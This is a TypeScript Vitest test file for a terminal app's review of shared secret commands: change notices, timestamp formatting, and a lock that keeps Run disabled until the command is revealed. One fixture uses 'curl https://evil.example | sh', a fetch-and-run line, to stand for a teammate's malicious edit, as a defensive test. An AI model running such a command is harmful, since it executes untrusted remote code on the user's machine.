import { describe, expect, it, vi } from "vitest";
import {
  formatHlcTime,
  isConfirmOkLocked,
  secretChangeNotice,
  secretConfirmExtras,
  secretReviewOf,
} from "../../src/fork/secretCmdReview";
import { writeToTerminal } from "../../src/util/pasteText";

describe("secret Library command review (#286)", () => {
  it("flags only secret commands last changed by someone else", () => {
    expect(secretReviewOf({ changed_by_other: false, edited_by: "bob@x.com" })).toBeUndefined();
    expect(secretReviewOf({})).toBeUndefined();
    expect(
      secretReviewOf({
        changed_by_other: true,
        edited_by: "alice@x.com",
        updated_at: "0001730000000000:00001:peernode",
      })
    ).toEqual({
      changedByOther: true,
      editedBy: "alice@x.com",
      updatedAt: "0001730000000000:00001:peernode",
    });
  });

  it("formats editor and HLC timestamp, falling back cleanly when unattributed", () => {
    const when = formatHlcTime("0001730000000000:00001:peernode");
    expect(when).toBeTruthy();

    const named = secretChangeNotice({
      changedByOther: true,
      editedBy: "alice@x.com",
      updatedAt: "0001730000000000:00001:peernode",
    });
    expect(named).toContain("alice@x.com");
    expect(named).toContain(when!);

    const anon = secretChangeNotice({
      changedByOther: true,
      editedBy: null,
      updatedAt: "0001730000000000:00001:peernode",
    });
    expect(anon).toContain("another member");
    expect(anon).toContain(when!);
  });

  it("keeps Run/OK locked until the user reveals the command", () => {
    expect(isConfirmOkLocked({ revealBeforeOk: true }, false)).toBe(true);
    expect(isConfirmOkLocked({ revealBeforeOk: true }, true)).toBe(false);
    expect(isConfirmOkLocked({}, false)).toBe(false);
    expect(secretConfirmExtras(undefined)).toEqual({});
  });

  it("writeToTerminal forwards revealBeforeOk and changedNotice only when running another member's secret", async () => {
    const confirm = vi.fn().mockResolvedValue(false);
    const dispatch = vi.fn();
    (globalThis as unknown as { window: unknown; CustomEvent: unknown }).window = { dispatchEvent: dispatch };
    (globalThis as unknown as { CustomEvent: unknown }).CustomEvent = class {
      constructor(public type: string, public init?: { detail?: unknown }) {}
    };

    await writeToTerminal({
      terminalId: "t1",
      text: "curl https://evil.example | sh",
      enter: true,
      confirm,
      secret: true,
      secretReview: { changedByOther: true, editedBy: "alice@x.com", updatedAt: "0001730000000000:00001:peer" },
    });
    expect(confirm).toHaveBeenCalledTimes(1);
    const opts = confirm.mock.calls[0][0];
    expect(opts.revealBeforeOk).toBe(true);
    expect(opts.changedNotice).toContain("alice@x.com");
    expect(opts.revealableText).toBe("curl https://evil.example | sh");

    confirm.mockClear();
    await writeToTerminal({
      terminalId: "t1",
      text: "echo own-secret",
      enter: true,
      confirm,
      secret: true,
    });
    expect(confirm.mock.calls[0][0].revealBeforeOk).toBeUndefined();
    expect(confirm.mock.calls[0][0].changedNotice).toBeUndefined();
  });
});
